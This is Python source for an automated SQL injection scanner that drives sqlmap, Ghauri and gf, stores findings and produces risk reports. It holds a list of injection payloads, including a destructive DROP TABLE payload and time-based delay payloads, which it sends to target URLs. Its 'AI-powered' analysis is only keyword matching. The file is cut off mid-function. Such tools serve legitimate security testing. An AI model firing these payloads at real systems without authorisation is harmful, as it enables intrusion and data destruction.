import fcntl
import hashlib
import json
import os
import re
import shutil
import subprocess
import tempfile
import time
from contextlib import contextmanager
from datetime import datetime
from pathlib import Path
from urllib.parse import parse_qs, urlparse, urlunparse

import click
import requests
import yaml
import sqlite3
from concurrent.futures import ThreadPoolExecutor, as_completed


class VulnSQLCacheManager:
    """Intelligent cache manager for SQL injection vulnerability scanning operations."""

    def __init__(self, cache_dir: str = "nuclei_cache", max_age_hours: int = 24):
        self.cache_dir = Path(cache_dir)
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.max_age_seconds = max_age_hours * 3600
        self.cache_index_file = self.cache_dir / "vulnsql_cache_index.json"
        self.cache_stats = {"hits": 0, "misses": 0, "total_requests": 0}

    def _generate_cache_key(self, target: str, tool: str, options: dict) -> str:
        """Generate unique cache key based on target and scan parameters."""
        # Create a deterministic key from target, tool, and options
        key_data = {
            "target": target,
            "tool": tool,
            "options": {k: v for k, v in sorted(options.items()) if v is not None},
        }
        key_string = json.dumps(key_data, sort_keys=True)
        return hashlib.sha256(key_string.encode()).hexdigest()

    def _is_cache_valid(self, cache_file: Path) -> bool:
        """Check if cache file is still valid based on age."""
        if not cache_file.exists():
            return False

        file_age = time.time() - cache_file.stat().st_mtime
        return file_age < self.max_age_seconds

    def get_cached_result(self, target: str, tool: str, options: dict):
        """Retrieve cached result if available and valid."""
        cache_key = self._generate_cache_key(target, tool, options)
        cache_file = self.cache_dir / f"{cache_key}.json"

        self.cache_stats["total_requests"] += 1

        if self._is_cache_valid(cache_file):
            try:
                with open(cache_file, "r") as f:
                    cached_data = json.load(f)
                    self.cache_stats["hits"] += 1
                    return cached_data
            except (json.JSONDecodeError, IOError):
                # If cache file is corrupted, treat as cache miss
                pass

        self.cache_stats["misses"] += 1
        return None

    def store_result(self, target: str, tool: str, options: dict, result_data: dict):
        """Store scan result in cache."""
        cache_key = self._generate_cache_key(target, tool, options)
        cache_file = self.cache_dir / f"{cache_key}.json"

        # Add metadata to cached result
        cache_data = {
            "metadata": {
                "target": target,
                "tool": tool,
                "options": options,
                "cached_at": time.strftime("%Y-%m-%d %H:%M:%S"),
                "cache_key": cache_key,
            },
            "result": result_data,
        }

        try:
            with open(cache_file, "w") as f:
                json.dump(cache_data, f, indent=2)

            # Update cache index
            self._update_cache_index(cache_key, target, tool)

        except IOError as e:
            print(f"⚠️  [CACHE] Failed to store cache: {e}")

    def _update_cache_index(self, cache_key: str, target: str, tool: str):
        """Update cache index with new entry."""
        index_data = {}

        if self.cache_index_file.exists():
            try:
                with open(self.cache_index_file, "r") as f:
                    index_data = json.load(f)
            except (json.JSONDecodeError, IOError):
                index_data = {}

        index_data[cache_key] = {
            "target": target,
            "tool": tool,
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "file_size": (self.cache_dir / f"{cache_key}.json").stat().st_size,
        }

        try:
            with open(self.cache_index_file, "w") as f:
                json.dump(index_data, f, indent=2)
        except IOError as e:
            print(f"⚠️  [CACHE] Failed to update cache index: {e}")

    def clear_cache(self) -> bool:
        """Clear all cached results."""
        try:
            if self.cache_dir.exists():
                shutil.rmtree(self.cache_dir)
                self.cache_dir.mkdir(parents=True, exist_ok=True)
                print("✅ [CACHE] All cached results cleared successfully")
                return True
            return True
        except Exception as e:
            print(f"❌ [CACHE] Failed to clear cache: {e}")
            return False

    def get_cache_stats(self) -> dict:
        """Get cache performance statistics."""
        cache_files = list(self.cache_dir.glob("*.json"))
        cache_size = sum(
            f.stat().st_size
            for f in cache_files
            if f.name != "vulnsql_cache_index.json"
        )

        hit_rate = (
            (self.cache_stats["hits"] / self.cache_stats["total_requests"] * 100)
            if self.cache_stats["total_requests"] > 0
            else 0
        )

        return {
            "cache_hits": self.cache_stats["hits"],
            "cache_misses": self.cache_stats["misses"],
            "hit_rate": f"{hit_rate:.1f}%",
            "total_requests": self.cache_stats["total_requests"],
            "cache_files": len(
                [f for f in cache_files if f.name != "vulnsql_cache_index.json"]
            ),
            "cache_size": cache_size,
            "cache_dir": str(self.cache_dir),
        }


def find_executable(name):
    """Find full path to executable, preventing B607 partial path issues."""
    full_path = shutil.which(name)
    if full_path:
        return full_path
    raise FileNotFoundError(f"Executable '{name}' not found in PATH")


@contextmanager
def file_lock(file_path):
    """Context manager for file locking to prevent concurrent access."""
    with open(file_path, "a") as lock_file:
        try:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            yield
        except IOError:
            raise Exception(
                "Another scan is already running. Use --force-resume to override."
            )
        finally:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)


def send_notification(webhook_url, message, service="slack"):
    """Send notification to Slack or Discord webhook."""
    try:
        if "discord" in webhook_url.lower() or service == "discord":
            payload = {"content": message}
        else:  # Slack
            payload = {"text": message}

        response = requests.post(webhook_url, json=payload, timeout=3)
        if response.status_code == 200:
            return True
    except Exception:
        pass
    return False


def ai_analyze_sqli_results(results, target_url):
    """AI-powered analysis of SQL injection results with comprehensive insights."""
    analysis = {
        "vulnerability_assessment": {},
        "risk_analysis": {},
        "attack_vectors": [],  # This should be a list
        "recommendations": [],  # This should be a list
        "executive_summary": {},
        "technical_details": {},
    }

    # Vulnerability Assessment
    critical_indicators = []
    high_risk_indicators = []
    medium_risk_indicators = []

    # Analyze SQLMap results
    if results.get("sqlmap_findings"):
        for finding in results["sqlmap_findings"]:
            finding_str = str(finding).lower()

            # Critical vulnerabilities
            if any(
                keyword in finding_str
                for keyword in [
                    "vulnerability confirmed",
                    "injection point",
                    "back-end dbms",
                    "current user extracted",
                    "database enumeration",
                    "table enumeration",
                ]
            ):
                critical_indicators.append(
                    {
                        "type": "SQL Injection Confirmed",
                        "severity": "CRITICAL",
                        "description": f"SQLMap confirmed vulnerability: {finding}",
                        "impact": "Full database compromise possible",
                        "tool": "SQLMap",
                    }
                )

            # High risk indicators
            elif any(
                keyword in finding_str
                for keyword in [
                    "time-based",
                    "boolean-based",
                    "union-based",
                    "error-based",
                ]
            ):
                high_risk_indicators.append(
                    {
                        "type": "SQL Injection Vector",
                        "severity": "HIGH",
                        "description": f"SQLMap detected injection vector: {finding}",
                        "impact": "Data extraction and manipulation possible",
                        "tool": "SQLMap",
                    }
                )

    # Analyze Ghauri results
    if results.get("ghauri_findings"):
        for finding in results["ghauri_findings"]:
            finding_str = str(finding).lower()

            if "vulnerable" in finding_str:
                critical_indicators.append(
                    {
                        "type": "SQL Injection Confirmed",
                        "severity": "CRITICAL",
                        "description": f"Ghauri confirmed vulnerability: {finding}",
                        "impact": "Database compromise via fast exploitation",
                        "tool": "Ghauri",
                    }
                )

    # Analyze basic test results
    if results.get("basic_sqli_results"):
        for vuln in results["basic_sqli_results"]:
            if vuln.get("vulnerable"):
                high_risk_indicators.append(
                    {
                        "type": "SQL Injection Pattern",
                        "severity": "HIGH",
                        "description": f"Basic test detected vulnerability in parameter: {vuln.get('parameter')}",
                        "payload": vuln.get("payload"),
                        "impact": "Potential SQL injection vulnerability",
                        "tool": "Basic Testing",
                    }
                )

    # Analyze GF pattern results
    if results.get("gf_findings"):
        for finding in results["gf_findings"]:
            medium_risk_indicators.append(
                {
                    "type": "SQL Pattern Match",
                    "severity": "MEDIUM",
                    "description": f"GF pattern match: {finding.get('description', 'Unknown')}",
                    "parameter": finding.get("parameter"),
                    "pattern": finding.get("pattern"),
                    "impact": "Requires manual verification",
                    "tool": "GF",
                }
            )

    # Risk Analysis
    total_critical = len(critical_indicators)
    total_high = len(high_risk_indicators)
    total_medium = len(medium_risk_indicators)

    risk_score = (total_critical * 10) + (total_high * 7) + (total_medium * 3)

    if risk_score >= 20:
        risk_level = "CRITICAL"
        risk_description = (
            "Immediate action required - Active SQL injection vulnerabilities confirmed"
        )
    elif risk_score >= 10:
        risk_level = "HIGH"
        risk_description = (
            "High probability of SQL injection vulnerabilities - Investigation required"
        )
    elif risk_score >= 5:
        risk_level = "MEDIUM"
        risk_description = (
            "Potential SQL injection indicators - Manual testing recommended"
        )
    else:
        risk_level = "LOW"
        risk_description = "No significant SQL injection indicators detected"

    analysis["vulnerability_assessment"] = {
        "critical_vulnerabilities": critical_indicators,
        "high_risk_vulnerabilities": high_risk_indicators,
        "medium_risk_vulnerabilities": medium_risk_indicators,
        "total_vulnerabilities": total_critical + total_high + total_medium,
    }

    analysis["risk_analysis"] = {
        "overall_risk_level": risk_level,
        "risk_score": risk_score,
        "risk_description": risk_description,
        "target_url": target_url,
        "critical_count": total_critical,
        "high_count": total_high,
        "medium_count": total_medium,
    }

    # Attack Vectors Analysis
    attack_vectors = []
    if critical_indicators or high_risk_indicators:
        if any(
            "time-based" in str(i).lower()
            for i in high_risk_indicators + critical_indicators
        ):
            attack_vectors.append(
                {
                    "vector": "Time-Based Blind SQL Injection",
                    "description": "Exploits database response delays to extract information",
                    "impact": "Data extraction through timing attacks",
                    "mitigation": "Implement query timeouts and input validation",
                }
            )

        if any(
            "union" in str(i).lower()
            for i in high_risk_indicators + critical_indicators
        ):
            attack_vectors.append(
                {
                    "vector": "Union-Based SQL Injection",
                    "description": "Uses UNION statements to extract database information",
                    "impact": "Direct data extraction and database enumeration",
                    "mitigation": "Use parameterized queries and input sanitization",
                }
            )

        if any(
            "error" in str(i).lower()
            for i in high_risk_indicators + critical_indicators
        ):
            attack_vectors.append(
                {
                    "vector": "Error-Based SQL Injection",
                    "description": "Exploits database error messages for information disclosure",
                    "impact": "Database structure and data leakage through errors",
                    "mitigation": "Implement proper error handling and logging",
                }
            )

        if any(
            "boolean" in str(i).lower()
            for i in high_risk_indicators + critical_indicators
        ):
            attack_vectors.append(
                {
                    "vector": "Boolean-Based Blind SQL Injection",
                    "description": "Uses true/false responses to extract information",
                    "impact": "Gradual data extraction through boolean logic",
                    "mitigation": "Input validation and parameterized queries",
                }
            )

    analysis["attack_vectors"] = attack_vectors

    # Recommendations
    recommendations = []

    if total_critical > 0:
        recommendations.extend(
            [
                "🚨 IMMEDIATE: Patch all confirmed SQL injection vulnerabilities",
                "🔒 URGENT: Implement parameterized queries/prepared statements",
                "🛡️ CRITICAL: Review and sanitize all database interactions",
                "⚡ PRIORITY: Disable database error reporting in production",
            ]
        )

    if total_high > 0:
        recommendations.extend(
            [
                "⚠️ HIGH: Conduct thorough code review for injection vulnerabilities",
                "🔍 INVESTIGATE: Manually verify all high-risk indicators",
                "🧪 TEST: Perform comprehensive penetration testing",
            ]
        )

    if total_medium > 0:
        recommendations.extend(
            [
                "📋 REVIEW: Analyze GF pattern matches for false positives",
                "🔬 VALIDATE: Manual testing of flagged parameters",
            ]
        )

    # General security recommendations
    recommendations.extend(
        [
            "🔐 Implement principle of least privilege for database accounts",
            "📊 Enable database activity monitoring and logging",
            "🛠️ Keep database systems and applications updated",
            "🏗️ Deploy Web Application Firewall (WAF) with SQL injection rules",
            "🔄 Conduct regular security assessments and code reviews",
        ]
    )

    analysis["recommendations"] = recommendations

    # Executive Summary
    analysis["executive_summary"] = {
        "assessment_overview": f"SQL injection vulnerability assessment completed for {target_url}",
        "key_findings": f"Identified {total_critical} critical, {total_high} high-risk, and {total_medium} medium-risk indicators",
        "business_impact": risk_description,
        "immediate_actions": (
            "Review critical and high-risk findings immediately"
            if total_critical + total_high > 0
            else "Continue monitoring and testing"
        ),
        "tools_effectiveness": f"Analysis based on {len([k for k in results.keys() if k.endswith('_results')])} security tools",
    }

    # Technical Details
    analysis["technical_details"] = {
        "scan_timestamp": datetime.now().isoformat(),
        "target_analysis": {
            "url": target_url,
            "injection_points": len(results.get("injection_points", [])),
            "parameters_tested": len(
                [
                    ip
                    for ip in results.get("injection_points", [])
                    if ip.get("type") == "GET"
                ]
            ),
        },
        "tool_results": {
            "sqlmap_executed": bool(results.get("sqlmap_results")),
            "ghauri_executed": bool(results.get("ghauri_results")),
            "gf_patterns_matched": bool(results.get("gf_results")),
            "basic_tests_performed": bool(results.get("basic_sqli_results")),
        },
    }

    return analysis


def load_custom_payloads(payloads_file):
    """Load custom SQL injection payloads from file."""
    if not payloads_file or not os.path.exists(payloads_file):
        return []

    payloads = []
    try:
        with open(payloads_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append(line)
        return payloads
    except Exception as e:
        print(f"❌ [ERROR] Failed to load payloads from {payloads_file}: {e}")
        return []


def init_database(db_path):
    """Initialize SQLite database for storing results."""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Create tables for storing scan results
        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS scan_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                start_time TEXT,
                end_time TEXT,
                total_targets INTEGER,
                vulnerable_targets INTEGER,
                status TEXT DEFAULT 'running',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """
        )

        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS target_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                target_url TEXT,
                scan_timestamp TEXT,
                injection_points_count INTEGER,
                sqlmap_executed BOOLEAN DEFAULT 0,
                ghauri_executed BOOLEAN DEFAULT 0,
                gf_executed BOOLEAN DEFAULT 0,
                basic_tests_executed BOOLEAN DEFAULT 0,
                vulnerabilities_found INTEGER DEFAULT 0,
                risk_level TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES scan_sessions (session_id)
            )
        """
        )

        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                target_url TEXT,
                vulnerability_type TEXT,
                severity TEXT,
                parameter_name TEXT,
                payload TEXT,
                tool_used TEXT,
                description TEXT,
                impact TEXT,
                mitigation TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES scan_sessions (session_id)
            )
        """
        )

        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS ai_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                target_url TEXT,
                risk_score INTEGER,
                risk_level TEXT,
                critical_count INTEGER,
                high_count INTEGER,
                medium_count INTEGER,
                attack_vectors TEXT,
                recommendations TEXT,
                executive_summary TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES scan_sessions (session_id)
            )
        """
        )

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ [ERROR] Failed to initialize database: {e}")
        return False


def store_scan_session(db_path, session_id, total_targets):
    """Store scan session in database."""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        cursor.execute(
            """
            INSERT OR REPLACE INTO scan_sessions 
            (session_id, start_time, total_targets, status) 
            VALUES (?, ?, ?, 'running')
        """,
            (session_id, datetime.now().isoformat(), total_targets),
        )

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ [ERROR] Failed to store scan session: {e}")
        return False


def store_target_result(db_path, session_id, result):
    """Store target scan result in database."""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Count vulnerabilities
        vuln_count = 0
        risk_level = "LOW"

        if result.get("basic_sqli_results"):
            vuln_count += len(
                [v for v in result["basic_sqli_results"] if v.get("vulnerable")]
            )

        if result.get("sqlmap_findings"):
            if any(
                "vulnerability confirmed" in str(f).lower()
                for f in result["sqlmap_findings"]
            ):
                vuln_count += 1
                risk_level = "CRITICAL"

        if result.get("ghauri_findings"):
            if any("vulnerable" in str(f).lower() for f in result["ghauri_findings"]):
                vuln_count += 1
                risk_level = "CRITICAL"

        if vuln_count > 0 and risk_level == "LOW":
            risk_level = "HIGH"

        cursor.execute(
            """
            INSERT INTO target_results 
            (session_id, target_url, scan_timestamp, injection_points_count,
             sqlmap_executed, ghauri_executed, gf_executed, basic_tests_executed,
             vulnerabilities_found, risk_level, status) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'completed')
        """,
            (
                session_id,
                result.get("target", "Unknown"),
                result.get("timestamp", datetime.now().isoformat()),
                len(result.get("injection_points", [])),
                bool(result.get("sqlmap_results")),
                bool(result.get("ghauri_results")),
                bool(result.get("gf_results")),
                bool(result.get("basic_sqli_results")),
                vuln_count,
                risk_level,
            ),
        )

        # Store individual vulnerabilities
        target_url = result.get("target", "Unknown")

        if result.get("basic_sqli_results"):
            for vuln in result["basic_sqli_results"]:
                if vuln.get("vulnerable"):
                    cursor.execute(
                        """
                        INSERT INTO vulnerabilities 
                        (session_id, target_url, vulnerability_type, severity, 
                         parameter_name, payload, tool_used, description, impact)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                        (
                            session_id,
                            target_url,
                            "SQL Injection",
                            "HIGH",
                            vuln.get("parameter"),
                            vuln.get("payload"),
                            "Basic Testing",
                            f"SQL injection detected in parameter: {vuln.get('parameter')}",
                            "Potential data extraction and manipulation",
                        ),
                    )

        if result.get("sqlmap_findings"):
            for finding in result["sqlmap_findings"]:
                if "vulnerability confirmed" in str(finding).lower():
                    cursor.execute(
                        """
                        INSERT INTO vulnerabilities 
                        (session_id, target_url, vulnerability_type, severity, 
                         tool_used, description, impact)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    """,
                        (
                            session_id,
                            target_url,
                            "SQL Injection",
                            "CRITICAL",
                            "SQLMap",
                            f"SQLMap confirmed: {finding}",
                            "Full database compromise possible",
                        ),
                    )

        if result.get("ghauri_findings"):
            for finding in result["ghauri_findings"]:
                if "vulnerable" in str(finding).lower():
                    cursor.execute(
                        """
                        INSERT INTO vulnerabilities 
                        (session_id, target_url, vulnerability_type, severity, 
                         tool_used, description, impact)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    """,
                        (
                            session_id,
                            target_url,
                            "SQL Injection",
                            "CRITICAL",
                            "Ghauri",
                            f"Ghauri confirmed: {finding}",
                            "Database compromise via fast exploitation",
                        ),
                    )

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ [ERROR] Failed to store target result: {e}")
        return False


def store_ai_analysis(db_path, session_id, target_url, ai_analysis):
    """Store AI analysis results in database."""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        risk_analysis = ai_analysis.get("risk_analysis", {})
        vuln_assessment = ai_analysis.get("vulnerability_assessment", {})

        cursor.execute(
            """
            INSERT INTO ai_analysis 
            (session_id, target_url, risk_score, risk_level, critical_count,
             high_count, medium_count, attack_vectors, recommendations, executive_summary)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
            (
                session_id,
                target_url,
                risk_analysis.get("risk_score", 0),
                risk_analysis.get("overall_risk_level", "UNKNOWN"),
                len(vuln_assessment.get("critical_vulnerabilities", [])),
                len(vuln_assessment.get("high_risk_vulnerabilities", [])),
                len(vuln_assessment.get("medium_risk_vulnerabilities", [])),
                str(ai_analysis.get("attack_vectors", [])),
                str(ai_analysis.get("recommendations", [])),
                str(ai_analysis.get("executive_summary", {})),
            ),
        )

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ [ERROR] Failed to store AI analysis: {e}")
        return False


def finalize_scan_session(db_path, session_id):
    """Finalize scan session in database."""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Count vulnerable targets
        cursor.execute(
            """
            SELECT COUNT(*) FROM target_results 
            WHERE session_id = ? AND vulnerabilities_found > 0
        """,
            (session_id,),
        )
        vulnerable_count = cursor.fetchone()[0]

        cursor.execute(
            """
            UPDATE scan_sessions 
            SET end_time = ?, vulnerable_targets = ?, status = 'completed'
            WHERE session_id = ?
        """,
            (datetime.now().isoformat(), vulnerable_count, session_id),
        )

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ [ERROR] Failed to finalize scan session: {e}")
        return False


def retry_request(func, *args, max_retries=3, **kwargs):
    """Retry function with exponential backoff."""
    for attempt in range(max_retries):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            if attempt == max_retries - 1:
                raise e
            wait_time = 2**attempt
            print(
                f"⚠️ [RETRY] Attempt {attempt + 1} failed, retrying in {wait_time}s: {e}"
            )
            time.sleep(wait_time)
    return None


def process_target_with_concurrency(
    target_url,
    options,
    tools_config,
    custom_payloads=None,
    ai_enabled=False,
    db_path=None,
    session_id=None,
    dry_run=False,
    retry_count=3,
):
    """Process a single target with all configurations."""
    if dry_run:
        print(f"🔍 [DRY-RUN] Would scan: {target_url}")
        print(
            f"🔧 [DRY-RUN] Tools: {', '.join([k for k, v in tools_config.items() if v])}"
        )
        if custom_payloads:
            print(f"🎯 [DRY-RUN] Custom payloads: {len(custom_payloads)} loaded")
        if ai_enabled:
            print(f"🧠 [DRY-RUN] AI analysis: Enabled")
        return {
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "dry_run": True,
            "status": "simulated",
        }

    print(f"🔍 [SCAN] Processing: {target_url}")

    result = {
        "target": target_url,
        "timestamp": datetime.now().isoformat(),
        "injection_points": [],
    }

    # Detect injection points with retry
    try:
        injection_points = retry_request(
            detect_injection_points, target_url, max_retries=retry_count
        )
        result["injection_points"] = (
            injection_points if injection_points is not None else []
        )
        print(
            f"🔍 [DETECT] Found {len(result['injection_points'])} potential injection points"
        )
    except Exception as e:
        print(f"❌ [ERROR] Failed to detect injection points for {target_url}: {e}")
        result["injection_points"] = []

    # Basic SQL injection testing
    if tools_config.get("use_basic"):
        try:
            print("🧪 [BASIC] Running basic SQL injection tests...")
            basic_results = retry_request(
                test_basic_sql_injection,
                target_url,
                custom_payloads=custom_payloads,
                max_retries=retry_count,
            )
            result["basic_sqli_results"] = (
                basic_results if basic_results is not None else []
            )
            if result["basic_sqli_results"]:
                vulnerabilities = [
                    r for r in result["basic_sqli_results"] if r.get("vulnerable")
                ]
                print(
                    f"🧪 [BASIC] Found {len(vulnerabilities)} potential vulnerabilities"
                )
        except Exception as e:
            print(f"❌ [ERROR] Basic testing failed for {target_url}: {e}")
            result["basic_sqli_results"] = []

    # SQLMap testing
    if tools_config.get("use_sqlmap"):
        try:
            print("🔥 [SQLMAP] Running SQLMap...")
            sqlmap_results = retry_request(
                run_sqlmap,
                target_url,
                options,
                tools_config.get("timeout", 300),
                max_retries=retry_count,
            )
            result["sqlmap_results"] = (
                sqlmap_results
                if sqlmap_results is not None
                else {"success": False, "error": "No results"}
            )
            if result["sqlmap_results"] and result["sqlmap_results"].get("success"):
                result["sqlmap_findings"] = parse_sqlmap_output(
                    result["sqlmap_results"]["output_file"]
                )
                print(f"🔥 [SQLMAP] Found {len(result['sqlmap_findings'])} findings")
            else:
                error_msg = (
                    result["sqlmap_results"].get("error", "Unknown error")
                    if result["sqlmap_results"]
                    else "No results"
                )
                print(f"❌ [SQLMAP] Failed: {error_msg}")
        except Exception as e:
            print(f"❌ [ERROR] SQLMap failed for {target_url}: {e}")
            result["sqlmap_results"] = {"success": False, "error": str(e)}

    # Ghauri testing
    if tools_config.get("use_ghauri"):
        try:
            print("⚡ [GHAURI] Running Ghauri...")
            ghauri_results = retry_request(
                run_ghauri,
                target_url,
                options,
                tools_config.get("timeout", 300),
                max_retries=retry_count,
            )
            result["ghauri_results"] = (
                ghauri_results
                if ghauri_results is not None
                else {"success": False, "error": "No results"}
            )
            if result["ghauri_results"] and result["ghauri_results"].get("success"):
                result["ghauri_findings"] = parse_ghauri_output(
                    result["ghauri_results"]["output_file"]
                )
                print(f"⚡ [GHAURI] Found {len(result['ghauri_findings'])} findings")
            else:
                error_msg = (
                    result["ghauri_results"].get("error", "Unknown error")
                    if result["ghauri_results"]
                    else "No results"
                )
                print(f"❌ [GHAURI] Failed: {error_msg}")
        except Exception as e:
            print(f"❌ [ERROR] Ghauri failed for {target_url}: {e}")
            result["ghauri_results"] = {"success": False, "error": str(e)}

    # GF pattern matching
    if tools_config.get("use_gf"):
        try:
            print("🔍 [GF] Running GF pattern matching...")
            gf_results = retry_request(
                run_gf_sqli_patterns,
                [target_url],
                options["output_dir"],
                max_retries=retry_count,
            )
            result["gf_results"] = gf_results if gf_results is not None else {}
            if result["gf_results"]:
                total_matches = sum(
                    r.get("match_count", 0) for r in result["gf_results"].values()
                )
                print(f"🔍 [GF] Found {total_matches} pattern matches")

                result["gf_findings"] = analyze_gf_results(result["gf_results"])
                print(
                    f"🔍 [GF] Identified {len(result['gf_findings'])} potential SQL injection points"
                )
            else:
                result["gf_findings"] = []
        except Exception as e:
            print(f"❌ [ERROR] GF failed for {target_url}: {e}")
            result["gf_results"] = {}
            result["gf_findings"] = []

    # AI Analysis
    if ai_enabled:
        try:
            print("🧠 [AI] Running AI analysis...")
            result["ai_analysis"] = ai_analyze_sqli_results(result, target_url)
            risk_level = result["ai_analysis"]["risk_analysis"]["overall_risk_level"]
            print(f"🧠 [AI] Risk assessment: {risk_level}")

            # Store AI analysis in database
            if db_path and session_id:
                store_ai_analysis(
                    db_path, session_id, target_url, result["ai_analysis"]
                )
        except Exception as e:
            print(f"❌ [ERROR] AI analysis failed for {target_url}: {e}")
            result["ai_analysis"] = {}

    # Store result in database
    if db_path and session_id:
        store_target_result(db_path, session_id, result)

    return result


def check_tool_availability():
    """Check if SQL injection tools are available."""
    tools = {}

    # Check SQLMap
    try:
        result = subprocess.run(
            [find_executable("sqlmap"), "--version"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode == 0:
            tools["sqlmap"] = {
                "available": True,
                "version": (
                    result.stdout.strip().split("\n")[0] if result.stdout else "Unknown"
                ),
                "path": shutil.which("sqlmap"),
            }
        else:
            tools["sqlmap"] = {"available": False, "error": "Not found"}
    except Exception as e:
        tools["sqlmap"] = {"available": False, "error": str(e)}

    # Check Ghauri
    try:
        result = subprocess.run(
            [find_executable("ghauri"), "--version"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode == 0:
            tools["ghauri"] = {
                "available": True,
                "version": (
                    result.stdout.strip().split("\n")[0] if result.stdout else "Unknown"
                ),
                "path": shutil.which("ghauri"),
            }
        else:
            tools["ghauri"] = {"available": False, "error": "Not found"}
    except Exception as e:
        tools["ghauri"] = {"available": False, "error": str(e)}

    # Check GF (grep for fun)
    try:
        result = subprocess.run(
            [find_executable("gf"), "-list"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            patterns = result.stdout.strip().split("\n") if result.stdout else []
            tools["gf"] = {
                "available": True,
                "version": "Available",
                "path": shutil.which("gf"),
                "patterns": len(patterns),
                "sql_patterns": [p for p in patterns if "sql" in p.lower()],
            }
        else:
            tools["gf"] = {"available": False, "error": "Not found"}
    except Exception as e:
        tools["gf"] = {"available": False, "error": str(e)}

    return tools


def detect_injection_points(url, timeout=5):
    """Detect potential SQL injection points in URL."""
    parsed_url = urlparse(url)
    injection_points = []

    # Check URL parameters
    if parsed_url.query:
        params = parse_qs(parsed_url.query)
        for param, values in params.items():
            injection_points.append(
                {
                    "type": "GET",
                    "parameter": param,
                    "value": values[0] if values else "",
                    "location": "URL",
                    "url": url,
                }
            )

    # Test for form parameters (POST)
    try:
        response = requests.get(url, timeout=timeout, verify=True)
        if response.status_code == 200:
            # Look for forms
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
            forms = re.findall(form_pattern, response.text, re.IGNORECASE)

            # Look for input fields
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, response.text, re.IGNORECASE)

            for input_name in inputs:
                injection_points.append(
                    {
                        "type": "POST",
                        "parameter": input_name,
                        "value": "",
                        "location": "FORM",
                        "url": url,
                    }
                )
    except Exception:
        pass

    # Check for common injection patterns in headers
    common_headers = ["User-Agent", "X-Forwarded-For", "X-Real-IP", "Referer", "Cookie"]
    for header in common_headers:
        injection_points.append(
            {
                "type": "HEADER",
                "parameter": header,
                "value": "",
                "location": "HEADER",
                "url": url,
            }
        )

    return injection_points


def test_basic_sql_injection(url, timeout=5, custom_payloads=None):
    """Test basic SQL injection patterns."""
    basic_payloads = [
        "'",
        '"',
        "')",
        "'\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1",
        "') OR 1=1--",
        "') OR 1=1#",
        '" OR "1"="1',
        '" OR 1=1--',
        '" OR 1=1#',
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE users; --",
        "'; EXEC sp_configure 'show advanced options', 1--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' OR BENCHMARK(1000000,MD5(1))--",
    ]

    # Add custom payloads if provided
    if custom_payloads:
        basic_payloads.extend(custom_payloads)

    results = []
    parsed_url = urlparse(url)

    for payload in basic_payloads:
        try:
            # Test in URL parameters
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                for param in params:
                    test_params = params.copy()
                    test_params[param] = [payload]

                    new_query = "&".join(
                        [f"{k}={v[0]}" for k, v in test_params.items()]
                    )
                    test_url = urlunparse(
                        (
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment,
                        )
                    )

                    start_time = time.time()
                    response = requests.get(test_url, timeout=timeout, verify=True)
                    response_time = time.time() - start_time

                    # Check for SQL error patterns
                    error_patterns = [
